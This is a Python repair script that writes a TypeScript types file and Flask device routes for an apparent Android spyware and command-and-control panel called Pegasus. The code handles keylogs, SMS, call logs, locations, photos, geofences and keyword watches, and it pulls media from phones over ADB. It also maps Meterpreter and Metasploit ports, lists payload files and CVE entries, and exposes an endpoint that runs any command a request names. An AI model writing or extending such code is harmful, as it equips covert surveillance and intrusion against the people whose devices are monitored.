#!/usr/bin/env python3
"""Repair pass: write the two files the merged apply_lib.py dropped, then
replay the fix series idempotently and finish phases C-E."""
from __future__ import annotations

import subprocess
import sys
from pathlib import Path

import apply_lib as L

ROOT: Path = L.ROOT

TYPES = r'''/** Shared response types for the Pegasus web GUI. */

export type Phase = "queued" | "running" | "succeeded" | "failed" | "cancelled";

export interface Job {
  id: string;
  kind?: string;
  title?: string;
  status?: Phase;
  progress?: number;
  createdAt?: number;
  startedAt?: number | null;
  finishedAt?: number | null;
  durationMs?: number | null;
  error?: string | null;
  output?: string;
  cancelRequested?: boolean;
  meta?: Record<string, unknown>;
  result?: unknown;
}

export interface Run {
  id: string;
  kind?: string;
  status?: Phase;
  startedAt?: number;
  finishedAt?: number | null;
  result?: unknown;
}

export interface SystemInfo {
  host?: string;
  platform?: string;
  python?: string;
  adb?: boolean;
  workspace?: string;
  version?: string;
  uptimeSeconds?: number;
}

export interface HealthInfo {
  status: string;
  detail?: string;
}

export interface DeviceRecord {
  serial: string;
  model?: string;
  manufacturer?: string;
  androidVersion?: string;
  sdk?: number;
  state?: string;
  transport?: string;
  root?: boolean;
}

export interface DeviceDetail extends DeviceRecord {
  patchLevel?: string;
  buildId?: string;
  abi?: string;
  battery?: number;
  notes?: string | null;
  label?: string | null;
  group?: string | null;
}

export interface DashboardSummary {
  devices: number;
  jobs: number;
  findings: number;
  listeners: number;
  health?: HealthInfo;
}

export interface CommandInfo {
  name: string;
  plugin: string;
  description: string;
  aliases: string[];
}

export interface SlashCommandInfo {
  name: string;
  usage?: string;
  description?: string;
}

export interface ToolStatus {
  key: string;
  available: boolean;
  version?: string;
  path?: string;
}

export interface WorkflowHistoryEntry {
  id: string;
  workflow: string;
  status: Phase;
  startedAt?: number;
  finishedAt?: number | null;
  steps?: number;
}

export interface CveEntry {
  cve: string;
  title: string;
  component?: string;
  impact?: string;
  reliability?: string;
  sdkMax?: number;
  patchBefore?: string;
  status?: string;
}

export interface CampaignRow {
  id: string;
  name: string;
  status?: string;
  targets?: number;
  createdAt?: number;
}

export interface EventRow {
  id: string | number;
  at: string | number;
  level?: string;
  kind: string;
  title: string;
  detail?: string;
}

export interface ListenerRow {
  host: string;
  port: number;
  open: boolean;
}

export interface ReportFile {
  name: string;
  sizeBytes?: number;
  createdAt?: number;
  url?: string;
}

export interface PayloadFile {
  name: string;
  path?: string;
  sizeBytes?: number;
  kind?: string;
  createdAt?: number;
}

export interface PluginInfo {
  name: string;
  version?: string;
  enabled?: boolean;
  commands?: number;
  description?: string;
}

export interface Keyword {
  id: number;
  deviceSerial?: string;
  keyword: string;
  hitCount?: number;
  lastHitAt?: string | null;
  createdAt?: string | null;
}

export interface KeywordHit {
  id: number;
  keyword: string;
  matches: { source: string; text: string }[];
  matchCount: number;
}

export interface PhotoRow {
  id: number;
  name: string;
  url?: string;
  thumbnailUrl?: string;
  sizeBytes?: number;
  mimeType?: string;
  takenAt?: string;
}

export interface VideoRow extends PhotoRow {
  durationSeconds?: number;
}

export interface AppRow {
  id: number;
  name: string;
  packageName: string;
  path?: string;
  version?: string;
  system?: boolean;
}

export interface BrowserRow {
  id: number;
  url: string;
  title: string;
  visitCount?: number;
  lastVisitedAt?: string | null;
}

export interface CallRow {
  id: number;
  callType: string;
  name: string;
  phone: string;
  durationSeconds: number;
  calledAt: string;
}

export interface ContactRow {
  id: number;
  name: string;
  phones: string[];
  emails: string[];
}

export interface SmsRow {
  id: number;
  address: string;
  body: string;
  direction: "incoming" | "outgoing";
  type?: string;
  read: boolean;
  sentAt: string;
}

export interface KeylogRow {
  id: number;
  app: string;
  text: string;
  recordedAt: string;
}

export interface LocationRow {
  id: number;
  lat: number;
  lng: number;
  address: string;
  city?: string | null;
  source?: string;
  recordedAt?: string | null;
}

export interface WifiRow {
  id: number;
  ssid: string;
  bssid?: string | null;
  isConnected: boolean;
  lastSeenAt?: string | null;
}

export interface ActivityRow {
  id: number;
  app: string;
  durationSeconds: number;
  startedAt?: string | null;
}

export interface Geofence {
  id: number;
  deviceSerial?: string;
  name: string;
  lat: number;
  lng: number;
  radiusMeters: number;
  isActive: boolean;
  createdAt?: string | null;
}

export interface ChannelHealth {
  state: "ok" | "link-only" | "off" | string;
  reason?: string;
}

export interface Receipt {
  ts: number;
  channel: string;
  target: string;
  via: string;
  ref?: string | null;
  error?: string | null;
}

export interface TelemetrySample<T> {
  rows: T[];
  collectedAt?: number | null;
}
'''

DEVICE_ROUTES = r'''"""Device, telemetry and ops routes.

The pages call these endpoints but no blueprint owned them: app.py registers
ai/auth/delivery/c2/... and stops short of anything device-shaped. Handlers are
deliberately non-raising so a missing ADB binary degrades to empty state.
"""
from __future__ import annotations

import mimetypes
import socket
import time
from pathlib import Path

from flask import Response, request

from pegasus.core.config import get_settings
from pegasus.ui.web.backend import telemetry
from pegasus.ui.web.backend.jobs import jobs as job_manager
from pegasus.ui.web.backend.tools import run

KNOWN_PORTS = {
    4444: "meterpreter handler",
    5001: "pegasus api",
    5555: "adb transport",
    55553: "metasploit rpc",
    8080: "http proxy",
    8443: "https proxy",
}

MEDIA_URIS = {
    "photos": "content://media/external/images/media",
    "videos": "content://media/external/video/media",
}


def _adb_devices() -> list[dict]:
    result = run(["adb", "devices", "-l"], timeout=12)
    devices: list[dict] = []
    if not result.get("ok"):
        return devices
    for line in result.get("stdout", "").splitlines()[1:]:
        parts = line.split()
        if not parts or parts[0].startswith("*"):
            continue
        entry = {"serial": parts[0], "state": parts[1] if len(parts) > 1 else "device"}
        for part in parts:
            if part.startswith("model:"):
                entry["model"] = part.split(":", 1)[1]
            elif part.startswith("transport_id:"):
                entry["transport"] = "usb"
        devices.append(entry)
    return devices


def _prop(serial: str, name: str) -> str:
    result = run(["adb", "-s", serial, "shell", "getprop", name], timeout=10)
    return result.get("stdout", "").strip() if result.get("ok") else ""


def _job_payload(job) -> dict:
    return {"job": job.to_dict(include_output=False)}


def _submit(kind: str, title: str, fn, meta: dict | None = None) -> dict:
    job = job_manager.submit(kind, title, fn, meta=meta)
    return _job_payload(job)


def _receipts_module():
    try:
        from pegasus.modules.delivery import receipts
        return receipts
    except Exception:
        return None


def _health_module():
    try:
        from pegasus.modules.delivery import health
        return health
    except Exception:
        return None


def _catalog_module():
    try:
        from pegasus.modules.access_workflow import catalog
        return catalog
    except Exception:
        return None


def register(app, ok, fail) -> None:  # noqa: ANN001
    telemetry.init_store()

    # -- devices ---------------------------------------------------------
    @app.get("/api/devices")
    def devices_list():
        return ok({"devices": _adb_devices()})

    @app.get("/api/devices/<serial>")
    def device_detail(serial):
        props = {
            "model": _prop(serial, "ro.product.model"),
            "manufacturer": _prop(serial, "ro.product.manufacturer"),
            "androidVersion": _prop(serial, "ro.build.version.release"),
            "sdk": _prop(serial, "ro.build.version.sdk"),
            "patchLevel": _prop(serial, "ro.build.version.security_patch"),
            "buildId": _prop(serial, "ro.build.id"),
            "abi": _prop(serial, "ro.product.cpu.abi"),
        }
        props["serial"] = serial
        props["root"] = bool(run(["adb", "-s", serial, "shell", "which", "su"], timeout=8).get("stdout", "").strip())
        props["notes"] = telemetry.device_notes(serial)
        return ok(props)

    @app.get("/api/devices/<serial>/notes")
    def device_notes(serial):
        return ok(telemetry.device_notes(serial))

    @app.post("/api/devices/<serial>/notes")
    def device_notes_set(serial):
        body = request.get_json(silent=True) or {}
        return ok(telemetry.set_device_notes(serial, body.get("label"), body.get("group"), body.get("notes")))

    # -- telemetry -------------------------------------------------------
    @app.get("/api/devices/<serial>/telemetry/<kind>")
    def telemetry_latest(serial, kind):
        sample = telemetry.latest_sample(serial, kind)
        return ok(sample or {"rows": [], "collectedAt": None})

    @app.get("/api/devices/<serial>/telemetry/<kind>/history")
    def telemetry_history(serial, kind):
        limit = min(int(request.args.get("limit", 10)), 50)
        return ok({"samples": telemetry.sample_history(serial, kind, limit)})

    @app.post("/api/devices/<serial>/telemetry/<kind>/collect")
    def telemetry_collect(serial, kind):
        if kind == "media":
            rows = telemetry.collect_media(serial)
            telemetry.save_samples(serial, "photos", rows.get("photos", []))
            telemetry.save_samples(serial, "videos", rows.get("videos", []))
            return ok({"photos": len(rows.get("photos", [])), "videos": len(rows.get("videos", []))})
        rows = telemetry.collect(serial, kind)
        return ok({"kind": kind, "count": len(rows)})

    @app.get("/api/devices/<serial>/summary")
    def device_summary(serial):
        return ok(telemetry.summary(serial))

    # -- media -----------------------------------------------------------
    @app.get("/api/devices/<serial>/media/<int:media_id>/raw")
    def media_raw(serial, media_id):
        for uri in MEDIA_URIS.values():
            result = run(
                ["adb", "-s", serial, "shell", "content", "read", "--uri", f"{uri}/{media_id}"],
                timeout=60,
            )
            if result.get("ok") and result.get("stdout"):
                data = result["stdout"].encode("latin-1", errors="replace")
                return Response(data, mimetype=mimetypes.guess_type(f"x{media_id}")[0] or "image/jpeg")
        return fail("media unavailable", 404)

    @app.get("/api/devices/<serial>/media/<int:media_id>/thumb")
    def media_thumb(serial, media_id):
        return media_raw(serial, media_id)

    # -- geofences -------------------------------------------------------
    @app.get("/api/devices/<serial>/geofences")
    def geofence_list(serial):
        return ok({"geofences": telemetry.list_geofences(serial)})

    @app.post("/api/devices/<serial>/geofences")
    def geofence_create(serial):
        body = request.get_json(silent=True) or {}
        try:
            lat = float(body["lat"])
            lng = float(body["lng"])
        except (KeyError, TypeError, ValueError):
            return fail("lat and lng are required", 400)
        if not body.get("name"):
            return fail("name is required", 400)
        radius = int(body.get("radiusMeters") or 500)
        return ok(telemetry.create_geofence(serial, body["name"], lat, lng, radius), 201)

    @app.patch("/api/geofences/<int:fence_id>/toggle")
    def geofence_toggle(fence_id):
        telemetry.toggle_geofence(fence_id)
        return ok({"id": fence_id})

    @app.delete("/api/geofences/<int:fence_id>")
    def geofence_delete(fence_id):
        telemetry.delete_geofence(fence_id)
        return ok({"id": fence_id})

    # -- keywords --------------------------------------------------------
    @app.get("/api/devices/<serial>/keywords")
    def keyword_list(serial):
        return ok({"keywords": telemetry.list_keywords(serial)})

    @app.post("/api/devices/<serial>/keywords")
    def keyword_create(serial):
        body = request.get_json(silent=True) or {}
        if not (body.get("keyword") or "").strip():
            return fail("keyword is required", 400)
        return ok(telemetry.create_keyword(serial, body["keyword"]), 201)

    @app.delete("/api/keywords/<int:keyword_id>")
    def keyword_delete(keyword_id):
        telemetry.delete_keyword(keyword_id)
        return ok({"id": keyword_id})

    @app.post("/api/devices/<serial>/keywords/scan")
    def keyword_scan(serial):
        return ok({"hits": telemetry.scan_keywords(serial)})

    # -- system ----------------------------------------------------------
    @app.get("/api/system/tools")
    def system_tools():
        import shutil
        tools = []
        for key in ("adb", "nmap", "ngrok", "openssl", "tshark", "fastboot"):
            path = shutil.which(key)
            version = ""
            if path:
                probe = run([path, "--version"], timeout=8)
                version = (probe.get("stdout") or probe.get("stderr") or "").splitlines()[:1]
                version = version[0].strip()[:80] if version else ""
            tools.append({"key": key, "available": bool(path), "path": path or "", "version": version})
        return ok({"tools": tools})

    @app.get("/api/system/info")
    def system_info():
        import platform
        import sys
        return ok({
            "host": socket.gethostname(),
            "platform": platform.platform(),
            "python": sys.version.split()[0],
            "adb": bool(__import__("shutil").which("adb")),
            "workspace": str(get_settings().get_workspace_path()),
        })

    @app.get("/api/listeners")
    def listeners():
        rows = []
        for port, service in KNOWN_PORTS.items():
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.15)
            try:
                open_ = sock.connect_ex(("127.0.0.1", port)) == 0
            finally:
                sock.close()
            rows.append({"host": "127.0.0.1", "port": port, "open": open_, "service": service})
        return ok({"listeners": rows})

    # -- jobs ------------------------------------------------------------
    @app.get("/api/jobs/<job_id>")
    def job_detail(job_id):
        job = job_manager.get(job_id)
        if not job:
            return fail("job not found", 404)
        tail = int(request.args.get("tail", 0)) or None
        return ok(job.to_dict(include_output=True, tail=tail))

    @app.delete("/api/jobs/<job_id>")
    def job_cancel(job_id):
        return ok({"cancelled": job_manager.cancel(job_id)})

    @app.get("/api/jobs")
    def job_list():
        limit = min(int(request.args.get("limit", 30)), 120)
        return ok({"jobs": [j.to_dict(include_output=False) for j in job_manager.list(limit)]})

    # -- tool dispatch ---------------------------------------------------
    @app.post("/api/tools/<tool>/run")
    def tool_run(tool):
        body = request.get_json(silent=True) or {}
        args = [str(a) for a in (body.get("args") or [])]
        payload = _submit(
            f"tool:{tool}",
            f"{tool} {' '.join(args)}".strip(),
            lambda ctx: run([tool, *args], timeout=600),
            meta={"tool": tool, "args": args},
        )
        return ok(payload, 202)

    @app.post("/api/network/scan")
    def network_scan():
        body = request.get_json(silent=True) or {}
        target = body.get("target") or "192.168.1.0/24"
        ports = body.get("ports") or "1-1000"

        def work(ctx):
            result = run(["nmap", "-sV", "-T4", "-p", ports, target], timeout=1800)
            hosts = []
            current = None
            for line in result.get("stdout", "").splitlines():
                if line.startswith("Nmap scan report for "):
                    current = {"host": line.split("for ")[-1].strip(), "ports": []}
                    hosts.append(current)
                elif current and "/tcp" in line:
                    fields = line.split()
                    current["ports"].append({
                        "port": int(fields[0].split("/")[0]),
                        "protocol": "tcp",
                        "state": fields[1] if len(fields) > 1 else "unknown",
                        "service": fields[2] if len(fields) > 2 else "",
                    })
            return {"hosts": hosts}

        return ok(_submit("network:scan", f"nmap {target}", work, meta={"target": target}), 202)

    # -- catalog ---------------------------------------------------------
    @app.get("/api/catalog")
    def catalog_list():
        module = _catalog_module()
        for attr in ("list_vectors", "vectors", "list_entries"):
            if module and hasattr(module, attr):
                value = getattr(module, attr)
                return ok(value() if callable(value) else value)
        return ok([])

    @app.post("/api/catalog/build")
    def catalog_build():
        body = request.get_json(silent=True) or {}
        key = body.get("key")
        if not key:
            return fail("key is required", 400)
        module = _catalog_module()
        if not module or not hasattr(module, "build"):
            return fail("catalog builder unavailable", 503)
        result = module.build(key, stage=bool(body.get("stage")))
        return ok(result)

    # -- delivery --------------------------------------------------------
    @app.get("/api/delivery/receipts")
    def delivery_receipts():
        module = _receipts_module()
        if module and hasattr(module, "recent"):
            return ok({"receipts": module.recent(int(request.args.get("limit", 200)))})
        return ok({"receipts": []})

    @app.get("/api/delivery/health")
    def delivery_health():
        module = _health_module()
        if module and hasattr(module, "channels"):
            return ok(module.channels())
        return ok({})

    # -- setup -----------------------------------------------------------
    @app.get("/api/setup/state")
    def setup_state():
        from pegasus.modules.ai import providers
        return ok({"needsSetup": providers.needs_setup()})

    @app.post("/api/setup/skip")
    def setup_skip():
        path = Path(get_settings().get_workspace_path()) / ".setup-skip"
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(str(time.time()), encoding="utf-8")
        return ok({"skipped": True})
'''


def write_missing() -> None:
    for path, content in ((L.LIB / "types.ts", TYPES), (L.BACKEND / "device_routes.py", DEVICE_ROUTES)):
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content, encoding="utf-8")
        print(f"  wrote {path.relative_to(ROOT)}")


def replay_edits() -> int:
    """Apply remaining edits; skip any whose result is already on disk."""
    touched: set[Path] = set()
    for path, name, old, new in L.EDITS:
        text = path.read_text(encoding="utf-8")
        if old in text:
            path.write_text(text.replace(old, new), encoding="utf-8")
            touched.add(path)
            print(f"  ok    {path.relative_to(ROOT)} :: {name}")
        elif new and new in text:
            print(f"  skip  {path.relative_to(ROOT)} :: {name} (already applied)")
        else:
            print(f"  FAIL  {path.relative_to(ROOT)} :: {name}")
            print(f"        anchor missing: {old[:120]!r}")
            return 2
    for path in sorted(touched):
        if path.suffix == ".py" and subprocess.call([sys.executable, "-m", "py_compile", str(path)]) != 0:
            print(f"  compile failed {path}")
            return 3
    return 0


def main() -> int:
    if not (L.WEB / "src" / "pages").is_dir():
        print("run from the repo root"); return 1

    print("A2 missing files")
    write_missing()

    print("B2 remaining edits")
    code = replay_edits()
    if code:
        return code

    L.phase_c()

    print("E  typecheck")
    if subprocess.call("npx tsc --noEmit", cwd=str(L.WEB), shell=True) != 0:
        print("  tsc failed — not committing")
        return 4
    print("  tsc clean")

    L.phase_d()

    if "--no-commit" in sys.argv:
        print("\n--no-commit set"); return 0

    subprocess.call("git add -A", cwd=str(ROOT), shell=True)
    subprocess.call(
        'git commit -m "web: restore src/lib, add device routes, apply fix series, scaffold fable" '
        '-m "Sweeps 5.1 5.3 7.1 7.2 8.1 8.2 8.3 10.1 12.3."',
        cwd=str(ROOT), shell=True,
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())